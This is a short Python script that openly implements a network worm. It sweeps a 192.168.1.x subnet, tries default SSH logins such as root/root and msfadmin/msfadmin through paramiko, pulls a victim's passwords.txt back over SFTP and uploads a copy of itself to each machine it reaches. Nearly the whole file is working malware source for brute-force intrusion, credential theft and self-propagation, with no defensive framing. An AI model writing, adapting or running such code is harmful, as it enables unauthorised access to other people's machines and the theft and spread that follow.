#!/usr/bin/env python3

""" 
Create a worm:
    It works to divide itself into machines with it in the same network by SSH.
    And upload worm to another machine by sftp and download.
"""

import logging
import paramiko
import sys


class Worm:

    def __init__(self, network_address):
        self._network = network_address

    @property
    def network(self):
        """ Network, on which the worm spreads. """
        return self._network

    @network.setter
    def network(self, new_network):
        self._network = new_network

    @property
    def credentials(self):
        """ Possible SSH credentials of the victim. """
        return (
            ('user', 'user'),
            ('root', 'root'),
            ('msfadmin', 'msfadmin')
        )

    def generate_addresses_on_network(self):
        # simple example in the network with subnet mask 255.255.255.0
        network = self.network.split('.')
        for host in range(1, 256): # 1 --> 256 192.168.1.0
            network[-1] = str(host)
            yield '.'.join(network)

    def spread_via_ssh(self):
        """ 
        It works to divide itself into machines with it in the same network by SSH.
        And upload worm to another machine by sftp and download.
        """
        # Setup SSH client.
        ssh = paramiko.SSHClient()
        ssh.load_system_host_keys() # optinal. -- possible removed.
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

        for remote_address in self.generate_addresses_on_network():
            logging.debug('Trying to spread on the remote host: {}'.format(remote_address))
            for user, passw in self.credentials:
                try:
                    ssh.connect(remote_address, port=22, username=user, password=passw)
                    logging.debug('The worm is succesfully connected to the remote host [{}, {}].'.format(user, passw))

                    # Create sftp client for file transmission.
                    sftp_client = ssh.open_sftp()
                    # Obtain file with victim's passwords.
                    try:
                        sftp_client.get('C:\\Users\\ragab\\passwords.txt', 'victim_ragab_cridintional.txt') # (local, remote machine).
                        logging.debug('The victim had passwords.txt')
                        
                        # Upload worm to the remote host.
                        sftp_client.put(sys.argv[0], 'C:\\Users\\ragab\\worm.py') # if the remote machine --> windows.
                        print()
                        sftp_client.close() # close sftp.
                        ssh.close() # close ssh.
                    except Exception:
                        logging.debug('The victim did not have passwords.txt')
                except Exception:
                    logging.debug('The remote host refused connection with credentials {},{}.'.format(user, passw))


if __name__ == '__main__':
    logging.basicConfig(level=logging.DEBUG)
    # Disable logging of paramiko to read and log.
    logging.getLogger('paramiko').setLevel(logging.CRITICAL)

    # Initialize worm with the network address.
    worm = Worm('192.168.1.0')
    # Spread via SSH connection on the network.
    worm.spread_via_ssh()
